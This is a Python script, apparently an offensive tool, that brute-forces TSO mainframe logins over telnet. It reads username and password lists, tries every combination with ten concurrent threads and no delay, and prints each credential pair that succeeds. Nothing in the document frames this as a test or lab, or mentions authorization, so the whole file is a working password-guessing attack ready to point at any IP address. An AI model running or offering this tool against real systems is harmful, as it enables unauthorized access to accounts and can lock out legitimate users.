import pexpect
import sys
import time
import re
import threading
import queue

# --- Configuration ---
THREAD_COUNT   = 10      # Number of concurrent worker threads
EXPECT_TIMEOUT = 2       # Seconds to wait for each expect()
ATTEMPT_DELAY  = 0.0     # Delay between attempts (per thread)

# --- Gather Inputs ---
TARGET_IP   = input("Enter target IP address: ").strip()
port_input  = input("Enter target port [23]: ").strip()
TARGET_PORT = port_input or "23"

USER_FILE = input("Path to usernames file: ").strip()
PASS_FILE = input("Path to passwords file: ").strip()

# Load username/password lists
with open(USER_FILE, "r") as f:
    usernames = [u.strip() for u in f if u.strip()]
with open(PASS_FILE, "r") as f:
    passwords = [p.strip() for p in f if p.strip()]

# Build a queue of all credential pairs
cred_queue = queue.Queue()
for user in usernames:
    for pwd in passwords:
        cred_queue.put((user, pwd))

# Thread-safe list for successes
successes = []
success_lock = threading.Lock()

def try_credentials(ip, port, username, password):
    """
    Attempts L TSO → username → password → look for SUCCESS.
    Returns True on success, False otherwise.
    """
    child = None
    try:
        child = pexpect.spawn(f"telnet {ip} {port}", timeout=EXPECT_TIMEOUT+1)
        # Uncomment to debug payloads:
        # child.logfile_read = sys.stdout.buffer

        # 1) Send logon
        child.sendline("L TSO")

        # 2) Expect USERID prompt
        child.expect(r"ENTER USERID\s*:", timeout=EXPECT_TIMEOUT)
        child.sendline(username)

        # 3) Expect PASSWORD prompt
        pwd_prompt = rf"ENTER CURRENT PASSWORD FOR {re.escape(username)}-"
        child.expect(pwd_prompt, timeout=EXPECT_TIMEOUT)
        child.sendline(password)

        # 4) Expect SUCCESS marker
        idx = child.expect([r"-?SUCCESS", pexpect.TIMEOUT, pexpect.EOF], timeout=EXPECT_TIMEOUT)
        return (idx == 0)

    except (pexpect.EOF, pexpect.TIMEOUT):
        return False
    finally:
        if child:
            child.close()

def worker():
    while True:
        try:
            user, pwd = cred_queue.get_nowait()
        except queue.Empty:
            return
        print(f"[{threading.current_thread().name}] Trying {user}/{pwd}...")
        if try_credentials(TARGET_IP, TARGET_PORT, user, pwd):
            print(f"[+] {user}/{pwd} → USER EXISTS-LOGIN COMPLETE")
            with success_lock:
                successes.append((user, pwd))
        cred_queue.task_done()
        if ATTEMPT_DELAY:
            time.sleep(ATTEMPT_DELAY)

# Spawn worker threads
threads = []
for i in range(min(THREAD_COUNT, cred_queue.qsize())):
    t = threading.Thread(target=worker, name=f"W{i+1}", daemon=True)
    t.start()
    threads.append(t)

# Wait for all attempts to finish
cred_queue.join()

# Report results
if successes:
    print("\nSummary of valid credentials:")
    for user, pwd in successes:
        print(f"  • {user}/{pwd}")
else:
    print("\nNo valid credentials found.")

# Exit code: 0 if any found, 1 otherwise
sys.exit(0 if successes else 1)
